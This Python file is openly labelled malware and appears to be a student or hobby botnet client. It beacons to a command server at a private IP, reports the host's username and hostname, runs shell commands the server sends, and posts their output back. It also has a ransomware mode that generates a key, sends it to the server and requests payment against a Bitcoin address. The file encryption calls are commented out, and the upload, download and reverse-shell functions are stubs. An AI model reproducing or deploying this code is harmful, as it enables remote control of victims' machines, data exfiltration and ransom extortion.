#######
# This is malware tell ur antivirus to chill bruh
#######
from datetime import datetime
import time
import uuid
import random
import socket
import requests
import platform
import os
from subprocess import check_output
import ctypes
import ransomware

HOME = 'http://10.0.0.14'

class Bot(object):
    def __init__(self):
        self.platform = platform.system()
        self.uid = uuid.uuid1()
        self.username = self.curr_user()
        self.hostname = socket.gethostname()
        self.ransom = False

    def curr_user(self):
        user = os.popen('whoami').read()
        user = user.split("\\", 1)[-1]
        return user
    def display_message(self, message):
        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0)
    
    def reverse_shell(self, dest_addr, bind_port):
        print("end")

    def ping_server(self):
        send = {
                    'platform': str(self.platform),
                    'hostname': self.hostname,
                    'username': self.username
                }           
        r = requests.post(HOME + '/api/' + self.uid + '/status', json=send)
        return r.text
    def send_key(self, key):
        r = requests.post(HOME + '/api/' + self.uid + '/lock', data= {'key':key})
        return r.text

    def request_key(self, btc_addr):
        r = requests.post(HOME + '/api/' + self.uid + '/pay', data={'btc_addr':btc_addr})
        return r.text


    def send_output(self, output):
        r = requests.post(HOME + '/api/' + self.uid + '/report', data= {'output':output})
        return r.text

    def run_command(self,command):
        if self.platform == "Windows":
            out = check_output(command, shell=True).decode()
            print(out)
            self.send_output(out)

    def upload(self, file):
        r = "end"
        return r
    
    def download(self, source_url, dest):
        r = "end"
        return r



    def run(self):
        
        start = time.time()
        while True:
            job = self.ping_server()
            print(job)
            syn = len(job) > 1
            cmdarr = job.split(" ")
            btc_addr = "asdgasr"
            if self.ransom:
                got_key = self.request_key(btc_addr)
                if got_key:

                    #ransomware.decrypt_all_dir("C:\\Users\\", got_key)
                    self.ransom = False


            if cmdarr[0] == "shell":
                self.run_command(" ".join(cmdarr[1:]))
            elif cmdarr[0] == "upload":
                if syn:
                    self.upload(job[1])
                else:
                    self.send_output("incorrect num of args: upload <path>")
            elif cmdarr[0] == "ransomware":
                    key = ransomware.key_gen()
                    print("ransom with key " + str(key))
                    #ransomware.encrypt_all_dir("C:\\Users\\", key)
                    self.send_key(str(key))
                    self.ransom = True

            elif cmdarr[0] == "download":
                if len(job) == 3:
                    self.download(job[1], job[2])
                else:
                    self.send_output("incorrect num of args: download <source_url> <dest>")
            elif cmdarr[0] == "reverse_shell":
                if len(job) == 3:
                    self.reverse_shell(job[1], job[2])
                else:
                    self.send_output("incorrect num of args: reverse_shell <dest_addr> <bind_port>")
            elif cmdarr[0] == "display_message":
                if len(job) > 1:
                    self.display_message(job.split("'"))
                else:
                    self.send_output("error")
            time.sleep(60.0 - ((time.time() - start) % 60.0))
       
def main():
    bot = Bot()
    bot.run()
if __name__ == "__main__":
    main()
